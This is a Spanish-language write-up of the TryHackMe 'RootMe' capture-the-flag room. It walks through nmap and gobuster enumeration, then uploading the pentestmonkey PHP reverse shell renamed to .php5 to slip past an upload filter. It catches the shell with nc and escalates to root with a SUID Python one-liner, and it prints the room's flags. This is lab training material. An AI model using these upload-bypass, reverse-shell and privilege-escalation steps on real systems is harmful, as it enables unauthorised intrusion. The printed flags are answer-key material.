---
tags:
  - eJPT
Category: Try Hack Me
title: Room Rootme
comments: "true"
image: /assets/img/machines/Rootme/Rootmebanner.jpeg
---

## Introducción
En este writeup se describe el proceso completo de explotación de la máquina RootMe en TryHackMe. La enumeración inicial permitió identificar servicios expuestos, principalmente SSH y un servidor web Apache. A partir de la información recolectada, se descubrieron rutas y funcionalidades ocultas en la aplicación web que facilitaron la obtención de una shell con permisos limitados. Finalmente, mediante técnicas de escalación de privilegios, se logró acceso root en el sistema.

## Enumeración
Ejecutamos un escaneo de puertos específicos sobre los puertos 22 y 80. El objetivo era identificar servicios expuestos y obtener información relevante para continuar con la fase de enumeración, detectando servicios como SSH y HTTP:
```bash
❯ nmap -sCV -p 22,80 10.10.48.74
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-27 15:37 -04
Nmap scan report for 10.10.48.74
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.43 seconds
```

### Enumeración WEB
Al acceder a la página web que se encuentra en el puerto 80, se muestra una animación simple con el nombre de la máquina. No hay enlaces aparentes ni funcionalidades interactivas visibles a simple vista, por lo que se procedió a realizar una enumeración más profunda del sitio.
![1](/assets/img/machines/Rootme/1.jpeg)

Posteriormente, realicé una enumeración de directorios utilizando Gobuster, lo cual reveló varias rutas interesantes en el sitio:
```bash
❯ gobuster dir -u http://10.10.48.74 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.48.74
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 312] [--> http://10.10.48.74/uploads/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.48.74/css/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.48.74/js/]
/panel                (Status: 301) [Size: 310] [--> http://10.10.48.74/panel/]
```

De todas ellas, la ruta /panel llamó particularmente la atención por su posible relación con una interfaz administrativa o protegida, por lo que se decidió investigarla con mayor profundidad.

Al acceder a la ruta /panel, se mostró un panel de carga de archivos. Esta funcionalidad puede representar una potencial vulnerabilidad si no cuenta con filtros o validaciones adecuadas.

![2](/assets/img/machines/Rootme/2.jpeg)

Para intentar explotar el panel de carga, se descargó una reverse shell en PHP desde el repositorio público de Pentestmonkey:
```bash
❯ gitclone https://github.com/pentestmonkey/php-reverse-shell.git
```
Una vez descargado el script php-reverse-shell.php, se editó para configurar la dirección IP y puerto del atacante, permitiendo establecer una conexión inversa hacia el sistema desde la máquina víctima.

El archivo fue renombrado con la extensión .php5 para evadir posibles restricciones del filtro de extensiones en el panel de subida:
```bash
❯ mv php-reverse-shell.php php-reverse-shell.php5
```

Este tipo de técnica aprovecha que algunos servidores aún interpretan extensiones como .php5 como código PHP válido, permitiendo la ejecución del payload incluso si .php estuviera bloqueado.

![3](/assets/img/machines/Rootme/3.jpeg)

Tras subir el archivo al panel, accedí a la ruta /uploads, donde se listaban los archivos cargados. Ahí se encontraba el reverse shell con la extensión .php5, lo que confirmaba que la carga había sido exitosa y que el archivo era accesible públicamente desde el navegador.

![4](/assets/img/machines/Rootme/4.jpeg)

Antes de acceder al archivo subido, dejé mi equipo en escucha en el puerto 443 con nc para recibir la conexión reversa. Al ejecutar el archivo desde el navegador, obtuve acceso a una shell remota como el usuario www-data, con permisos limitados. Para mejorar la interacción, usé script /dev/null -c bash, lo que me permitió continuar con la enumeración y explotación desde una terminal más cómoda.

```bash
❯ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.8.182.113] from (UNKNOWN) [10.10.48.74] 58944
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:07:34 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@rootme:/$ 
```

### Captura flag user
A continuación, realicé una búsqueda por el sistema de archivos para localizar la primera flag. Encontré el archivo en /var/www/user.txt y al leer su contenido obtuve la flag de user: THM{y0u_g0t_a_sh3ll}.

```bash
www-data@rootme:/$ find / -type f -name user.txt 2> /dev/null
find / -type f -name user.txt 2> /dev/null
/var/www/user.txt
www-data@rootme:/$ cat /var/www/user.txt
cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

### Captura flag root
Luego, escalé privilegios a root utilizando un shell con permisos elevados a través de Python. Posteriormente, busqué el archivo de la flag de root, ubicado en /root/root.txt. Al leer su contenido, obtuve la flag de root: THM{pr1v1l3g3_3sc4l4t10n}.

```bash
www-data@rootme:/$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
#  find / -type f -name root.txt
 find / -type f -name root.txt
/root/root.txt
# cat /root/root.txt
cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

